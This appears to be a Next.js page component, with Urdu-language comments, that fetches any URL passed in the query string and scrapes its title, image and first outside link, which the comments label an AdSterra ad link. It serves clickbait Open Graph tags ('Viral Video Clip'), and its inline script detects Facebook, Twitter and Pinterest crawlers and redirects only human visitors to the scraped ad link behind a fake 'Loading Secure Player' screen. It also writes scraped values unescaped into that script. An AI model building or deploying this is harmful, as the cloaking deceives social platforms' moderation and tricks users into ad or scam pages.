export default async function Home({ searchParams }) {
  const params = await searchParams;
  const targetUrl = params.url || '';

  let ogData = {
    title: "Viral Video Clip +3",
    image: "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7", // Backup image
    destination: "https://google.com" // Backup redirect
  };

  if (targetUrl) {
    try {
      const res = await fetch(targetUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://www.google.com/'
        }
      });
      const html = await res.text();
      
      // 🖼️ 1. Image nikalne ka special tareeqa (Jo aap ke HTML layout ke mutabiq hai)
      const imgMatch = html.match(/src=["'](https:\/\/blogger\.googleusercontent\.com\/img\/b\/[^"']+)["']/i) ||
                       html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || 
                       html.match(/<img[^>]*src=["']([^"']*)["']/i);
      if (imgMatch) {
        ogData.image = imgMatch[1];
      }
      
      // 📝 2. Title nikalne ka tareeqa
      const titleMatch = html.match(/<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["']/i) ||
                        html.match(/<title>([^<]*)<\/title>/i);
      if (titleMatch) {
        ogData.title = titleMatch[1];
      }
      
      // 🔗 3. AdSterra Link nikalne ka special regex (Jo pure text mein se bhi dhoond le ga)
      const rawLinks = html.match(/https?:\/\/[^\s"'<>]+/g);
      if (rawLinks) {
        const foundLink = rawLinks.find(link => 
          !link.includes('blogspot.com') && 
          !link.includes('google.com') && 
          !link.includes('w3.org') && 
          !link.includes('blogger.com') && 
          !link.includes('whatsapp.com')
        );
        if (foundLink) {
          // Agar link ke aakhir mein quotation mark ya kachra bacha ho to saaf karein
          ogData.destination = foundLink.split('"')[0].split("'")[0];
        }
      }
    } catch (e) {
      console.error(e);
    }
  }

  return (
    <>
      <title>{ogData.title}</title>
      <meta property="og:title" content={ogData.title} />
      <meta property="og:image" content={ogData.image} />
      <meta property="og:description" content="Click to watch full content." />
      <meta property="og:type" content="article" />
      <meta property="og:image:width" content="1200" />
      <meta property="og:image:height" content="630" />

      <script
        dangerouslySetInnerHTML={{
          __html: `
            const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
            if (!isBot && "${ogData.destination}") {
              window.location.href = "${ogData.destination}";
            }
          `,
        }}
      />
      <div style={{ textAlign: 'center', marginTop: '20%', fontFamily: 'sans-serif', color: '#333' }}>
        <h2>Loading Secure Player...</h2>
        <p>Please wait while the stream configures.</p>
      </div>
    </>
  );
    }
